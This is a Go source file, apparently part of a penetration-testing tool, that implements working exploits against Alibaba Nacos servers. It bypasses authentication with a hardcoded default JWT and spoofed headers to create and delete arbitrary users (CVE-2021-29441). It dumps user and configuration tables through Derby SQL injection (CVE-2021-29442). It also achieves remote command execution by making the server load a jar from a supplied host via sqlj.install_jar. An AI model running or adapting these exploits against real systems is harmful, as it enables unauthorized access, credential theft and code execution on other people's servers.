package nacos

import (
	"bytes"
	"context"
	"fmt"
	"mime/multipart"
	"net/http"
	"net/url"
	"slack-wails/lib/clients"
	"slack-wails/lib/gologger"
	"slack-wails/lib/util"
	"strings"
)

const token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g"
const cve_2021_29411_validateURI = "v1/auth/users?accessToken=" + token + "&pageNo=1&pageSize=9"
const cve_2021_29411_userURI = "v1/auth/users"
const cve_2021_29442_URI = "v1/cs/ops/derby?sql="

var sqi = []string{"select * from users", "select * from config_tags_relation", "select * from app_configdata_relation_pubs", "select * from app_configdata_relation_subs", "select * from app_list", "select * from config_info_aggr", "select * from config_info_tag", "select * from config_info_beta", "select * from his_config_info", "select * from config_info"}

// url 必须输入Nacos页面路径 例如 http://xxx/nacos
// 任意用户添加
// UA绕过 ser-Agent: Nacos-Server
// JWT默认key绕过
// serverIdentity头绕过 Nacos <= 2.2.0
func CVE_2021_29441_Step1(url, username, password string, client *http.Client) bool {
	header := map[string]string{
		"User-Agent":     "Nacos-Server",
		"accessToken":    token,
		"serverIdentity": "security",
	}
	_, body, err := clients.NewRequest("GET", url+cve_2021_29411_validateURI, header, nil, 10, false, client)
	if err != nil || !(strings.Contains(string(body), "username") && strings.Contains(string(body), "password")) {
		return false
	}
	header["Content-Type"] = "application/x-www-form-urlencoded"
	content := fmt.Sprintf("username=%s&password=%s", username, password)
	_, body, err = clients.NewRequest("POST", url+cve_2021_29411_userURI, header, strings.NewReader(content), 10, false, client)
	if err != nil {
		return false
	}
	return strings.Contains(string(body), "create user ok")
}

// 删除用户
func CVE_2021_29441_Step2(url, username string, client *http.Client) bool {
	header := map[string]string{
		"User-Agent":     "Nacos-Server",
		"accessToken":    token,
		"serverIdentity": "security",
	}
	_, body, err := clients.NewRequest("DELETE", url+cve_2021_29411_userURI+"?username="+username, header, nil, 10, false, client)
	if err != nil {
		return false
	}
	return strings.Contains(string(body), "delete user ok")
}

// CVE-2021-29442 Derby SQL注入
func CVE_2021_29442(url string, client *http.Client) string {
	var result string
	for _, sql := range sqi {
		_, body, err := clients.NewSimpleGetRequest(url+cve_2021_29442_URI+sql, client)
		if err != nil {
			return "请求失败已停止，返回之前SQL语句请求结果\n\n" + result
		}
		if strings.Contains(string(body), "\"code\":200") {
			result += string(body) + "\n"
		}
	}
	return result
}

func DerbySqljinstalljarRCE(ctx context.Context, headers, target, command, service string, client *http.Client) string {
	var times int
	removalURL := target + "v1/cs/ops/data/removal"
	derbyURL := target + "v1/cs/ops/derby"
	var tempHeader []string
	if headers != "" && strings.Contains(headers, ":") {
		tempHeader = strings.Split(headers, ":")
	}
	for i := 0; i < 1<<31-1; i++ {
		id := util.RandomStr(8)
		postSQL := fmt.Sprintf(
			`CALL sqlj.install_jar('%s', 'NACOS.%s', 0)
   CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS.%s')
   CREATE FUNCTION S_EXAMPLE_%s( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec'
   `, service, id, id, id)
		getSQL := fmt.Sprintf("select * from (select count(*) as b, S_EXAMPLE_%s('%s') as a from config_info) tmp /*ROWS FETCH NEXT*/", id, command)
		body := &bytes.Buffer{}
		writer := multipart.NewWriter(body)
		part, err := writer.CreateFormFile("file", "postSql")
		if err != nil {
			gologger.Debug(ctx, "Failed to create form file: "+err.Error())
		}
		_, err = part.Write([]byte(postSQL))
		if err != nil {
			gologger.Debug(ctx, "Failed to write to form file: "+err.Error())
		}
		writer.Close()
		header := map[string]string{
			"Content-Type": writer.FormDataContentType(),
		}
		if len(tempHeader) >= 2 {
			header[tempHeader[0]] = tempHeader[1]
		}
		_, respBody, err := clients.NewRequest("POST", removalURL, header, body, 10, true, client)
		if err != nil {
			gologger.Debug(ctx, err)
		}
		times++
		if times > 1000 {
			return "不存在该漏洞"
		}
		if strings.Contains(string(respBody), "\"code\":200") {
			_, getBody, err := clients.NewSimpleGetRequest(derbyURL+"?sql="+url.QueryEscape(getSQL), client)
			if err != nil {
				gologger.Debug(ctx, "Failed to read response body: "+err.Error())
			}
			return string(getBody)
		}
	}
	return "不存在该漏洞"
}
